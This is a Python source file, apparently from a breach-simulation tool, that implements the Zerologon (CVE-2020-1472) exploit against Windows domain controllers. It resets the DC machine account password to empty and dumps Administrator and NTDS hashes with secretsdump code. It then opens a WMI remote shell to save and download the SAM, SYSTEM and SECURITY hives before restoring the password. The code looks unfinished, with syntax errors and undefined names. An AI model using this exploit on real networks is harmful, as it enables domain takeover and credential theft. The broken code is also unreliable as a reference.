"""
Zerologon, CVE-2020-1472
Implementation based on https://github.com/dirkjanm/CVE-2020-1472/ and https://github.com/risksense/zerologon/.
"""

from __future__ import division, print_function

import argparse
import cmd
import codecs
import io
import logging
import ntpath
import os
import re
import sys
import time
import traceback
from binascii import hexlify, unhexlify

import impacket
from Cryptodome.Cipher import AES, ARC4, DES
from impacket import crypto, version
from impacket.dcerpc.v5 import epm, nrpc, transport
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.examples import logger
from impacket.examples.secretsdump import (LocalOperations, LSASecrets,
                                           NTDSHashes, RemoteOperations,
                                           SAMHashes)
from impacket.krb5.keytab import Keytab
from impacket.smbconnection import (SMB2_DIALECT_002, SMB2_DIALECT_21,
                                    SMB_DIALECT, SMBConnection)

from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.network.zerologon_fingerprint import ZerologonFinger

LOG = logging.getLogger(__name__)


_orig_stdout = None
_new_stdout = None


def _set_stdout_to_in_memory_text_stream():
    # set stdout to in-memory text stream, to capture info that would otherwise be printed
    _orig_stdout = sys.stdout
    _new_stdout = io.StringIO()
    sys.stdout = _new_stdout


def _unset_stdout_and_return_captured():
    # set stdout to original and return captured output
    sys.stdout = _orig_stdout
    _new_stdout.seek(0)
    return _new_stdout.read()


class ZerologonExploiter(HostExploiter):
    _TARGET_OS_TYPE = ['windows']
    _EXPLOITED_SERVICE = 'Netlogon'
    MAX_ATTEMPTS = 2000
    OPTIONS_FOR_SECRETSDUMP =\
        {
            'aes_key': None,
            'bootkey': None,
            'can_process_SAM_LSA': True,
            'dc_ip': None,
            'debug': False,
            'exec_method': 'smbexec',
            'hashes': None,
            'history': False,
            'is_remote' True,
            'just_dc': True,
            'just_dc_ntlm': False,
            'just_dc_user': None,
            'k': False,
            'keytab': None,
            'no_lmhash': True,
            'no_pass': True,
            'ntds': None,
            'outputfile': None,
            'pwd_last_set': False,
            'resumefile': None,
            'sam': None,
            'security': None,
            'system': None,  # sam, security, and system are assigned in a copy in get_original_pwd_nthash()
            'target': '',
            'target_ip': '',  # target and target_ip are assigned in a copy in get_admin_pwd_hashes()
            'ts': False,
            'use_vss': False,
            'user_status': False
        }

    def __init__(self, host):
        super().__init__(host)
        self.vulnerable_port = None
        self.zerologon_finger = ZerologonFinger()

    def _exploit_host(self):
        DC_IP, DC_NAME, DC_HANDLE = self.zerologon_finger.get_dc_details()

        if self.is_exploitable():
            LOG.info("Target vulnerable, changing account password to empty string.")

            # Connect to the DC's Netlogon service.
            rpc_con = self.connect_to_dc(DC_IP)

            # Start exploiting attempts.
            # Max attempts = 2000. Expected average number of attempts needed: 256.
            LOG.debug("Attempting exploit.")
            result = None
            for _ in range(0, self.MAX_ATTEMPTS):
                try:
                    result = self.attempt_exploit(DC_HANDLE, rpc_con, DC_NAME)
                except nrpc.DCERPCSessionError as e:
                    # Failure should be due to a STATUS_ACCESS_DENIED error.
                    # Otherwise, the attack is probably not working.
                    if e.get_error_code() != 0xc0000022:
                        LOG.info(f"Unexpected error code from DC: {e.get_error_code()}")
                except BaseException as e:
                    LOG.info(f"Unexpected error: {e}")

                if result is not None:
                    break

            if result['ErrorCode'] == 0:
                LOG.info("Exploit complete!")
            else:
                LOG.info(f"Non-zero return code: {result['ErrorCode']}. Something went wrong.")

            _exploited = True

            ## how do i execute monkey on the exploited machine?

        else:
            LOG.info("Exploit failed. Target is either patched or an unexpected error was encountered.")
            _exploited = False

        # Restore DC's original password.
        if _exploited:
            if self.restore_password(DC_HANDLE, DC_IP, DC_NAME):
                LOG.info("System exploited and password restored successfully.")
            else:
                LOG.info("System exploited but couldn't restore password!")
        else:
            LOG.info("System was not exploited.")

        return _exploited

    def is_exploitable(self):
        return self.zerologon_finger.get_host_fingerprint(self.host)

    def connect_to_dc(self, DC_IP):
        binding = epm.hept_map(DC_IP, nrpc.MSRPC_UUID_NRPC,
                               protocol='ncacn_ip_tcp')
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
        return rpc_con

    def attempt_exploit(self, DC_HANDLE, rpc_con, DC_NAME):
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = DC_HANDLE + '\x00'
        request['AccountName'] = DC_NAME + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = 0
        request['Authenticator'] = authenticator
        request['ComputerName'] = DC_NAME + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516
        return rpc_con.request(request)

    def restore_password(self, DC_HANDLE, DC_IP, DC_NAME):
        LOG.info("Restoring original password...")

        LOG.debug("DCSync; getting admin password's hashes.")
        admin_pwd_hashes = self.get_admin_pwd_hashes(DC_NAME, DC_IP)

        try:
            if not admin_pwd_hashes:
                raise Exception("Couldn't extract admin password's hashes.")

            LOG.debug("Getting original DC password's nthash.")
            original_pwd_nthash = self.get_original_pwd_nthash(DC_IP, admin_pwd_hashes)
            if not original_pwd_nthash:
                raise Exception("Couldn't extract original DC password's nthash.")

            # Keep authenticating until successful.
            LOG.debug("Attempting password restoration.")
            for _ in range(0, self.MAX_ATTEMPTS):
                rpc_con = self.attempt_restoration(DC_HANDLE, DC_IP, DC_NAME, original_pwd_nthash)
                if rpc_con is not None:
                    break

            if rpc_con:
                LOG.debug("DC machine account password should be restored to its original value.")
                return True
            else:
                raise Exception("Failed to restore password! Max attempts exceeded?")

        except Exception as e:
            LOG.error(e)

    def get_admin_pwd_hashes(self, DC_NAME, DC_IP):
        options = self.OPTIONS_FOR_SECRETSDUMP.copy()
        options['target'] = '$@'.join([DC_NAME, DC_IP])  # format for DC account - "NetBIOSName$@0.0.0.0"
        options['target_ip'] = DC_IP
        options['dc_ip'] = DC_IP

        dumped_secrets = self.get_dumped_secrets(options=options
                                                 remote_name=DC_IP,
                                                 username=DC_NAME)
        for secret in dumped_secrets:
            if 'Administrator' in secret:
                hashes = secret.split(':')[2:4]  # format of secret - "domain\uid:rid:lmhash:nthash:::"
                return ':'.join(hashes)  # format - "lmhash:nthash"

    def get_original_pwd_nthash(self, DC_IP, admin_pwd_hashes):
        if not self.save_HKLM_keys_locally(DC_IP, admin_pwd_hashes):
            return

        options = self.OPTIONS_FOR_SECRETSDUMP.copy()
        for name in ['system', 'sam', 'security']:
            options[name] = os.path.join(os.path.expanduser('~'), f'monkey-{name}.save')
        options['dc_ip'] = DC_IP

        dumped_secrets = self.get_dumped_secrets(options=options,
                                                 remote_name='LOCAL')
        for secret in dumped_secrets:
            if '$MACHINE.ACC: ' in secret:  # format of secret - "$MACHINE.ACC: lmhash:nthash"
                nthash = secret.split(':')[2]
                return nthash

    def get_dumped_secrets(self, options, remote_name='', username='', password='', domain=''):
        dumper = DumpSecrets(remote_name, username, password, domain, options)
        dumped_secrets = dumper.dump().split('\n')
        return dumped_secrets

    def save_HKLM_keys_locally(self, DC_IP, admin_pwd_hashes):
        LOG.debug("Starting remote shell on victim.")

        wmiexec = Wmiexec(ip=DC_IP,
                          username='Administrator',
                          hashes=admin_pwd_hashes,
                          domain=DC_IP)

        remote_shell = wmiexec.run()
        if remote_shell:
            _set_stdout_to_in_memory_text_stream()

            # Save HKLM keys on victim.
            shell.onecmd('reg save HKLM\SYSTEM system.save && ' +
                         'reg save HKLM\SAM sam.save && ' +
                         'reg save HKLM\SECURITY security.save')

            # Get HKLM keys locally (can't run these together because it needs to call do_get()).
            shell.onecmd('get system.save')
            shell.onecmd('get sam.save')
            shell.onecmd('get security.save')

            # Delete saved keys on victim.
            shell.onecmd('del /f system.save sam.save security.save')

            info = _unset_stdout_and_return_captured()
            LOG.debug(f"Getting victim HKLM keys via remote shell: {info}")
            return True

        else:
            raise Exception("Could not start remote shell on DC.")

    def attempt_restoration(self, DC_HANDLE, DC_IP, DC_NAME, original_pwd_nthash):
        # Connect to the DC's Netlogon service.
        rpc_con = self.connect_to_dc(DC_IP)

        plaintext = b'\x00'*8
        ciphertext = b'\x00'*8
        flags = 0x212fffff

        # Send challenge and authentication request.
        server_challenge_response = nrpc.hNetrServerReqChallenge(rpc_con, DC_HANDLE + '\x00',
                                                                 DC_NAME + '\x00', plaintext)
        server_challenge = server_challenge_response['ServerChallenge']

        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                rpc_con, DC_HANDLE + '\x00', DC_NAME + '$\x00',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                DC_NAME + '\x00', ciphertext, flags
            )

            # It worked!
            assert server_auth['ErrorCode'] == 0
            server_auth.dump()
            session_key = nrpc.ComputeSessionKeyAES(None, b'\x00'*8, server_challenge,
                                                    unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))

            try:
                authenticator = nrpc.NETLOGON_AUTHENTICATOR()
                authenticator['Credential'] = ciphertext
                authenticator['Timestamp'] = b"\x00" * 4

                nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
                nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)

                request = NetrServerPasswordSet()
                request['PrimaryName'] = NULL
                request['AccountName'] = DC_NAME + '$\x00'
                request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
                request['ComputerName'] = DC_NAME + '\x00'
                request["Authenticator"] = authenticator
                pwd_data = impacket.crypto.SamEncryptNTLMHash(unhexlify(original_pwd_nthash), sessionKey)
                request["UasNewPassword"] = pwd_data
                resp = rpc_con.request(request)
                resp.dump()

            except Exception as e:
                LOG.info(f"Unexpected error: {e}")

            return rpc_con

        except nrpc.DCERPCSessionError as e:
            # Failure should be due to a STATUS_ACCESS_DENIED error; otherwise, the attack is probably not working.
            if e.get_error_code() == 0xc0000022:
                return None
            else:
                LOG.info(f"Unexpected error code from DC: {e.get_error_code()}")

        except BaseException as e:
            LOG.info(f"Unexpected error: {e}")


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName', nrpc.PLOGONSRV_HANDLE),
        ('AccountName', nrpc.WSTR),
        ('SecureChannelType', nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName', nrpc.WSTR),
        ('Authenticator', nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword', nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )


class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator', nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode', nrpc.NTSTATUS),
    )


# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
# Used to get Administrator and original DC passwords' hashes
class DumpSecrets:
    def __init__(self, remote_name, username='', password='', domain='', options=None):
        self.__use_VSS_method = options['use_vss']
        self.__remote_name = remote_name
        self.__remote_host = options['target_ip']
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aes_key = options['aes_key']
        self.__smb_connection = None
        self.__remote_ops = None
        self.__SAM_hashes = None
        self.__NTDS_hashes = None
        self.__LSA_secrets = None
        self.__system_hive = options['system']
        self.__bootkey = options['bootkey']
        self.__security_hive = options['security']
        self.__sam_hive = options['sam']
        self.__ntds_file = options['ntds']
        self.__history = options['history']
        self.__no_lmhash = options['no_lmhash']
        self.__is_remote = options['is_remote']
        self.__output_file_name = options['outputfile']
        self.__do_kerberos = options['k']
        self.__just_DC = options['just_dc']
        self.__just_DC_NTLM = options['just_dc_ntlm']
        self.__just_user = options['just_dc_user']
        self.__pwd_last_set = options['pwd_last_set']
        self.__print_user_status = options['user_status']
        self.__resume_file_name = options['resumefile']
        self.__can_process_SAM_LSA = options['can_process_SAM_LSA']
        self.__kdc_host = options['dc_ip']
        self.__options = options

        if options['hashes'] is not None:
            self.__lmhash, self.__nthash = options['hashes'].split(':')

    def connect(self):
        self.__smb_connection = SMBConnection(self.__remote_name, self.__remote_host)
        self.__smb_connection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        _set_stdout_to_in_memory_text_stream()
        dumped_secrets = ''

        try:
            if self.__remote_name.upper() == 'LOCAL' and self.__username == '':
                self.__is_remote = False
                self.__use_VSS_method = True
                if self.__system_hive:
                    local_operations = LocalOperations(self.__system_hive)
                    bootkey = local_operations.getBootKey()
                    if self.__ntds_file is not None:
                        # Let's grab target's configuration about LM Hashes storage.
                        self.__no_lmhash = local_operations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootkey = binascii.unhexlify(self.__bootkey)

            else:
                self.__is_remote = True
                bootkey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__do_kerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            LOG.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remote_ops = RemoteOperations(self.__smb_connection, self.__do_kerberos, self.__kdc_host)
                    self.__remote_ops.setExecMethod(self.__options['exec_method'])
                    if self.__just_DC is False and self.__just_DC_NTLM is False or self.__use_VSS_method is True:
                        self.__remote_ops.enableRegistry()
                        bootkey = self.__remote_ops.getBootKey()
                        # Let's check whether target system stores LM Hashes.
                        self.__no_lmhash = self.__remote_ops.checkNoLMHashPolicy()
                except Exception as e:
                    self.__can_process_SAM_LSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                            and self.__do_kerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off.
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/.
                        LOG.error('Policy SPN target name validation might be restricting full DRSUAPI dump.' +
                                  'Try -just-dc-user')
                    else:
                        LOG.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA.
            if self.__just_DC is False and self.__just_DC_NTLM is False and self.__can_process_SAM_LSA:
                try:
                    if self.__is_remote is True:
                        SAM_file_name = self.__remote_ops.saveSAM()
                    else:
                        SAM_file_name = self.__sam_hive

                    self.__SAM_hashes = SAMHashes(SAM_file_name, bootkey, isRemote=self.__is_remote)
                    self.__SAM_hashes.dump()
                    if self.__output_file_name is not None:
                        self.__SAM_hashes.export(self.__output_file_name)
                except Exception as e:
                    LOG.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__is_remote is True:
                        SECURITY_file_name = self.__remote_ops.saveSECURITY()
                    else:
                        SECURITY_file_name = self.__security_hive

                    self.__LSA_secrets = LSASecrets(SECURITY_file_name, bootkey, self.__remote_ops,
                                                    isRemote=self.__is_remote, history=self.__history)
                    self.__LSA_secrets.dumpCachedHashes()
                    if self.__output_file_name is not None:
                        self.__LSA_secrets.exportCached(self.__output_file_name)
                    self.__LSA_secrets.dumpSecrets()
                    if self.__output_file_name is not None:
                        self.__LSA_secrets.exportSecrets(self.__output_file_name)
                except Exception as e:
                    LOG.debug(traceback.print_exc())
                    LOG.error('LSA hashes extraction failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work.
            if self.__is_remote is True:
                if self.__use_VSS_method and self.__remote_ops is not None:
                    NTDS_file_name = self.__remote_ops.saveNTDS()
                else:
                    NTDS_file_name = None
            else:
                NTDS_file_name = self.__ntds_file

            self.__NTDS_hashes = NTDSHashes(NTDS_file_name, bootkey, isRemote=self.__is_remote, history=self.__history,
                                            noLMHash=self.__no_lmhash, remoteOps=self.__remote_ops,
                                            useVSSMethod=self.__use_VSS_method, justNTLM=self.__just_DC_NTLM,
                                            pwdLastSet=self.__pwd_last_set, resumeSession=self.__resume_file_name,
                                            outputFileName=self.__output_file_name, justUser=self.__just_user,
                                            printUserStatus=self.__print_user_status)
            try:
                self.__NTDS_hashes.dump()
            except Exception as e:
                LOG.debug(traceback.print_exc())
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resume_file = self.__NTDS_hashes.getResumeSessionFile()
                    if resume_file is not None:
                        os.unlink(resume_file)
                LOG.error(e)
                if self.__just_user and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                    LOG.error("You just got that error because there might be some duplicates of the same name. "
                              "Try specifying the domain name for the user as well. It is important to specify it "
                              "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                elif self.__use_VSS_method is False:
                    LOG.error('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            LOG.debug(traceback.print_exc())
            LOG.error(e)
            if self.__NTDS_hashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    resume_file = self.__NTDS_hashes.getResumeSessionFile()
                    if resume_file is not None:
                        os.unlink(resume_file)
            try:
                self.cleanup()
            except:
                pass
        finally:
            dumped_secrets = _unset_stdout_and_return_captured()  # includes hashes and kerberos keys
            return dumped_secrets

    def cleanup(self):
        LOG.debug('Cleaning up...')
        if self.__remote_ops:
            self.__remote_ops.finish()
        if self.__SAM_hashes:
            self.__SAM_hashes.finish()
        if self.__LSA_secrets:
            self.__LSA_secrets.finish()
        if self.__NTDS_hashes:
            self.__NTDS_hashes.finish()

# how to execute monkey on exploited machine
# clean up logging
# mention in report explicitly - machine exploited/not (return True, if yes) & password restored/not
# mention patching details in report
# add exploit info to documentation


# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
# Used to get HKLM keys for restoring original DC password
class Wmiexec:
    OUTPUT_FILENAME = '__' + str(time.time())

    def __init__(self, ip, username, hashes, password='', domain='', share=None, noOutput=False):
        self.__ip = ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash, self.__nthash = hashes.split(':')
        self.__share = share
        self.__noOutput = noOutput
        self.shell = None

    def run(self):
        if self.__noOutput is False:
            smbConnection = SMBConnection(self.__ip, self.__ip)
            smbConnection.login(user=self.__username,
                                password=self.__password,
                                domain=self.__domain,
                                lmhash=self.__lmhash,
                                nthash=self.__nthash)

            dcom = DCOMConnection(target=self.__ip,
                                  username=self.__username,
                                  password=self.__password,
                                  domain=self.__domain,
                                  lmhash=self.__lmhash,
                                  nthash=self.__nthash,
                                  oxidResolver=True)

        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection, OUTPUT_FILENAME)
            return self.shell

        except (Exception, KeyboardInterrupt) as e:
            LOG.error(str(e))
            smbConnection.logoff()
            dcom.disconnect()


# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
# Used to start remote shell on victim
class RemoteShell(cmd.Cmd):
    CODEC = sys.stdout.encoding

    def __init__(self, share, win32Process, smbConnection, outputFilename):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + outputFilename
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = str('C:\\')
        self.__noOutput = True

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_get(self, src_path):
        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            local_file_path = os.path.join(os.path.expanduser('~'), 'monkey-'+filename)
            fh = open(local_file_path, 'wb')
            LOG.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()
        except Exception as e:
            LOG.error(str(e))
            if os.path.exists(local_file_path):
                os.remove(local_file_path)

    def do_exit(self, s):
        return True

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive.
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid.
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong.
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path.
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(self.CODEC)
            except UnicodeDecodeError:
                LOG.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                          'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                          'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(self.CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait.
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting.
                    LOG.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''
